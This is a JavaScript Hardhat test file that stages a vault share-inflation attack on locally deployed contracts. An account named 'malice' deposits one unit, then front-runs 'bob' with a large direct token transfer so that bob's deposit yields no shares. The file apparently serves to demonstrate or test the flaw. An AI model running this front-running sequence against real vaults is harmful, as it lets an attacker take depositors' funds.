const {
  time,
  loadFixture,
} = require("@nomicfoundation/hardhat-toolbox/network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");

describe("VaultAttack", function () {
  async function deployVault() {
    // Contracts are deployed using the first signer/account by default
    const [owner, malice, bob] = await ethers.getSigners();

    const Token = await ethers.getContractFactory("QyToken");
    const Vault = await ethers.getContractFactory("Vault");
    const token = await Token.deploy();
    await token.waitForDeployment();

    const deployedTokenAddress = await token.getAddress();
    await token.getTokens(malice, 1000000);
    await token.getTokens(bob, 1000000);

    console.log("deployed to:", deployedTokenAddress);
    const vault = await Vault.connect(owner).deploy(deployedTokenAddress);
    await vault.waitForDeployment();
    const deployedVaultAddress = await vault.getAddress();
    console.log("vault deployed to:", deployedVaultAddress);

    //approve contract to make transactions on behalf
    await token.connect(malice).approve(deployedVaultAddress, 1000000);
    await token.connect(bob).approve(deployedVaultAddress, 1000000);
    await token.connect(owner).approve(deployedVaultAddress, 1000000);

    return { token, vault, deployedVaultAddress, owner, malice, bob };
  }

  describe("InflationAttack", function () {
    it("it should mimicks inflation attack", async function () {
      const { token, vault, deployedVaultAddress, owner, malice, bob } = await loadFixture(deployVault);

      await expect(vault.connect(malice).deposit(1))
      .to.emit(vault, "Event")
      .withArgs(malice.address, "sharesPrice", 1, 1)

      //malice front run bob
      await token.connect(malice).transfer(deployedVaultAddress, 20000.000000);
      //bob deposit
      await expect(vault.connect(bob).deposit(20000.000000));

      await expect(vault.connect(malice).withdraw(1))
      .to.emit(vault, "Event")
      .withArgs(malice.address, "sharesPrice", 0, 0)

      //shares are gone
      await expect(vault.connect(bob).withdraw(1))
            .to.be.revertedWith('Not enough shares');

    });
  });
});
